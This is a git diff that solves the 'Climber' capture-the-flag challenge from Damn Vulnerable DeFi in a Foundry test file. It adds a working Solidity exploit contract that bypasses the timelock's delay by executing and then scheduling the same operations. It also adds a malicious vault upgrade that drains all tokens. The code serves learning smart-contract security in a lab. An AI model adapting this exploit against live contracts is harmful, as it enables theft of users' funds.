@@ -7,6 +7,92 @@ import {ClimberVault} from "../../src/climber/ClimberVault.sol";
 import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+
+contract ClimberExploiter {
+
+    ClimberVault vault;
+    ClimberTimelock timelock;
+    address recovery;
+    DamnValuableToken token;
+
+    address[]  targets = new address[](4);
+    uint256[]  values = new uint256[](4);
+    bytes[] data = new bytes[](4);
+
+    constructor(ClimberVault _vault, ClimberTimelock _timelock, address _recovery, DamnValuableToken _token) {
+        vault = _vault;
+        timelock = _timelock;
+        recovery = _recovery;
+        token = _token;
+    }
+    
+    function exploit() external{
+        address maliciousImpl = address(new MaliciousVault());
+
+        // Prepare the data for the timelock operations
+        targets[0] = address(timelock);
+        values[0] = 0;
+        data[0] = abi.encodeWithSignature(
+            "grantRole(bytes32,address)",
+            keccak256("PROPOSER_ROLE"),         
+            address(this)               
+        );
+
+        targets[1] = address(timelock);
+        values[1] = 0;
+        data[1] = abi.encodeWithSignature(
+            "updateDelay(uint64)",
+            uint64(0)             
+        );
+
+        targets[2] = address(vault);
+        values[2] = 0;
+        data[2] = abi.encodeWithSignature(
+            "transferOwnership(address)",
+            address(this)
+        );
+
+
+        targets[3] = address(this);
+        values[3] = 0;
+        data[3] = abi.encodeWithSignature(
+            "timelockSchedule()"
+        );
+
+        // Execute the timelock operations
+        timelock.execute(targets, values, data, bytes32(0));
+        
+        // Upgrade the vault to the malicious implementation
+        vault.upgradeToAndCall(address(maliciousImpl), "");
+
+        // Drain all tokens from the vault to the recovery address
+        MaliciousVault(address(vault)).drainFunds(address(token), recovery);
+
+    }
+
+    // Function to be called by the timelock during the exploit
+    function timelockSchedule() external {
+        timelock.schedule(targets, values, data, bytes32(0));
+    }
+
+
+}
+
+    // Malicious vault implementation to drain funds
+
+  contract MaliciousVault is ClimberVault {
+
+        // Function to drain all tokens from the vault to a specified receiver
+        function drainFunds(address token, address receiver) external {
+            SafeTransferLib.safeTransfer(token, receiver, IERC20(token).balanceOf(address(this)));
+        }
+
+  }
+
+
 
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -38,7 +124,7 @@ contract ClimberChallenge is Test {
         vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
 
         // Deploy the vault behind a proxy,
-        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
+        // passing the necessary addresses for the ClimberVault::initialize(address,address,address) function
         vault = ClimberVault(
             address(
                 new ERC1967Proxy(
@@ -81,12 +167,29 @@ contract ClimberChallenge is Test {
         assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
     }
 
-    /**
-     * CODE YOUR SOLUTION HERE
-     */
+    /*
+        The ClimberTimelock contract has a vulnerability that allows an attacker to bypass the timelock delay
+        and execute arbitrary operations immediately. This is possible because the timelock's execute function
+        does not properly enforce the delay for operations that are scheduled and executed within the same
+        transaction. By exploiting this flaw, an attacker can gain control of the ClimberVault by
+        scheduling and executing a series of operations that grant them the necessary roles, reduce the delay,
+        and transfer ownership of the vault to themselves. Once they have control of the vault, they can
+        upgrade it to a malicious implementation that allows them to drain all the tokens from the vault
+        to their own address.
+    */
+   
     function test_climber() public checkSolvedByPlayer {
-        
+
+        ClimberExploiter exploiter = new ClimberExploiter(
+            vault, timelock, recovery, token
+        );
+
+        exploiter.exploit();
+
+       
+
     }
+
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
